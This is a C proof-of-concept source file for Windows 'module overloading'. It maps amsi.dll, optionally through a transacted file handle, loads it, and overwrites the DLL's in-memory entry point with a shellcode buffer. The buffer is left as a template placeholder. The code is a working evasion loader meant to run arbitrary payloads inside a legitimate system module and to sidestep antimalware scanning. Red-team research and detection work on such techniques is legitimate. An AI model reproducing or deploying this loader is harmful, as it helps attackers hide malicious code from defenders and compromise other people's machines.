/****
 * Modified module overloading
 * a PoC only, no DLL searching or error handling
 * 
*/
#include <windows.h>
#include <winternl.h> // For NTSTATUS definitions
#include <psapi.h>
#include <stdlib.h> // For ExitProcess
#include <tlhelp32.h>
#include <stdio.h>
#include <ctype.h>

#include <stdint.h>

// Necessary for certain definitions like ACCESS_MASK
#ifndef WIN32_NO_STATUS
#define WIN32_NO_STATUS
#include <ntstatus.h>
#undef WIN32_NO_STATUS
#else
#include <ntstatus.h>
#endif

////////////////////////////////////

// Define the NT API function pointers
typedef LONG(__stdcall* NtCreateSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
// typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);

typedef NTSTATUS(__stdcall* NtCreateTransaction_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);

NtCreateSection_t NtCreateSection;
NtMapViewOfSection_t NtMapViewOfSection;
NtCreateTransaction_t NtCreateTransaction;


// Load NT functions
void LoadNtFunctions() {
    HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
    NtCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtCreateTransaction = (NtCreateTransaction_t)GetProcAddress(hNtdll, "NtCreateTransaction");
}


///////////////////////////////////////

unsigned char magiccode[] = ####SHELLCODE####;

int main(int argc, char *argv[])
{
    printf("Starting program...\n");

    // // Open the DLL file to read headers
    // HANDLE fileHandle = CreateFile("C:\\windows\\system32\\amsi.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    // if (fileHandle == INVALID_HANDLE_VALUE) {
    //     printf("Failed to open DLL file. Error: %lu\n", GetLastError());
    //     return 1;
    // } else {
	// 	printf("[+] DLL file amsi.dll opened.\n");
	// }

    // HANDLE fileMapping = CreateFileMapping(fileHandle, NULL, PAGE_READONLY, 0, 0, NULL);
    // if (fileMapping == NULL) {
    //     printf("Failed to create file mapping. Error: %lu\n", GetLastError());
    //     CloseHandle(fileHandle);
    //     return 1;
    // } else {
	// 	printf("[+] File mapping created.\n");
	// }

    // LPVOID fileBase = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
    // if (fileBase == NULL) {
    //     printf("Failed to map view of file. Error: %lu\n", GetLastError());
    //     CloseHandle(fileMapping);
    //     CloseHandle(fileHandle);
    //     return 1;
    // } else {
	// 	printf("[+] File mapped.\n");
	//  }

    // Default value for bTxF
    BOOL bTxF = FALSE;

    // Check if the user provided command-line arguments
    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "-txf") == 0) {
            bTxF = TRUE;
            break;
        }
    }

    // Display debug message about transaction mode
    printf("[+] Transaction Mode: %s\n", bTxF ? "Enabled" : "Disabled");

    LoadNtFunctions(); // Load the NT functions

    wchar_t dllPath[] = L"C:\\windows\\system32\\amsi.dll"; // Path to the DLL
    HANDLE fileHandle;
    if (bTxF) {
        OBJECT_ATTRIBUTES ObjAttr = { sizeof(OBJECT_ATTRIBUTES) };
        HANDLE hTransaction;
        NTSTATUS NtStatus = NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &ObjAttr, nullptr, nullptr, 0, 0, 0, nullptr, nullptr);
        if (!NT_SUCCESS(NtStatus)) {
            printf("[-] Failed to create transaction (error 0x%x)\n", NtStatus);
            return 1;
        }

        // Display debug message about creating transaction
        printf("[+] Transaction created successfully.\n");

        fileHandle = CreateFileTransactedW(dllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr, hTransaction, nullptr, nullptr);
        if (fileHandle == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open DLL file transacted. Error: %lu\n", GetLastError());
            CloseHandle(hTransaction);
            return 1;
        }

        // Display debug message about opening DLL file transacted
        printf("[+] DLL file opened transacted successfully.\n");
    } else {
        fileHandle = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (fileHandle == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open DLL file. Error: %lu\n", GetLastError());
            return 1;
        }

        // Display debug message about opening DLL file
        printf("[+] DLL file opened successfully.\n");
    }
    // Open the DLL file with optional transaction
    // HANDLE fileHandle = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    // if (fileHandle == INVALID_HANDLE_VALUE) {
    //     printf("Failed to open DLL file. Error: %lu\n", GetLastError());
    //     return 1;
    // }

    // Create a section from the file
    HANDLE hSection = NULL;
    // LONG status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
    LONG status = NtCreateSection(&hSection, SECTION_MAP_READ, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
    if (status != 0) {
        printf("NtCreateSection failed. Status: %x\n", status);
        CloseHandle(fileHandle);
        return 1;
    }

    // Map the section into the process
    PVOID fileBase = NULL;
    SIZE_T viewSize = 0;
    status = NtMapViewOfSection(hSection, GetCurrentProcess(), &fileBase, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);
    if (status != 0) {
        printf("NtMapViewOfSection failed. Status: %x\n", status);
        CloseHandle(hSection);
        CloseHandle(fileHandle);
        return 1;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
    DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;

    // Load the DLL to get its base address in current process
    HMODULE hDll = LoadLibrary("C:\\windows\\system32\\amsi.dll");

    if (hDll == NULL) {
        printf("Failed to load DLL. Error: %lu\n", GetLastError());
        UnmapViewOfFile(fileBase);
        CloseHandle(fileHandle);
        return 1;
    } else { 
		printf("[+] DLL loaded.\n");
	}

    // Calculate the AddressOfEntryPoint in current process
    LPVOID dllEntryPoint = (LPVOID)(entryPointRVA + (DWORD_PTR)hDll);
	printf("[+] DLL entry point: %p\n", dllEntryPoint);

    // Overwrite the AddressOfEntryPoint with magiccode
    SIZE_T bytesWritten;
    BOOL result = WriteProcessMemory(GetCurrentProcess(), dllEntryPoint, magiccode, sizeof(magiccode), &bytesWritten);
    if (!result) {
        printf("Failed to write magiccode. Error: %lu\n", GetLastError());
        FreeLibrary(hDll);
        CloseHandle(hSection);
        UnmapViewOfFile(fileBase);
        // CloseHandle(fileMapping);
        CloseHandle(fileHandle);
        return 1;
    } else {
		printf("[+] Magic code written.\n");
	}

    // Create a thread to execute at the DLL's entry point
    // DWORD threadID;
    // HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, &threadID);
    // if (hThread == NULL) {
    //     printf("Failed to create a thread. Error: %lu\n", GetLastError());
    //     FreeLibrary(hDll);
    //     UnmapViewOfFile(fileBase);
    //     CloseHandle(fileMapping);
    //     CloseHandle(fileHandle);
    //     return 1;
    // }
	printf("[+] No need to create thread.\n");

    // Wait for the thread to execute and then clean up
    // if (WaitForSingleObject(hThread, 5000) == WAIT_TIMEOUT) { // Wait 5 seconds
    //     TerminateThread(hThread, 0); // Forcibly terminates the thread
    //     printf("[+] Default thread was terminated.\n");
    // }

    // Get the exit code of the thread.
    // DWORD exitCode = 0;
    // if (!GetExitCodeThread(hThread, &exitCode)) {
    //     printf("[-] GetExitCodeThread failed: %d\n", GetLastError());
    // } else {
    //     printf("[+] Thread exited with code: %lu\n", exitCode);
    // }

    // CloseHandle(hThread);
    FreeLibrary(hDll);
    UnmapViewOfFile(fileBase);
    // CloseHandle(fileMapping);
    CloseHandle(fileHandle);
    CloseHandle(hSection);
    // Terminate the process
    ExitProcess(0);
    return 0;


}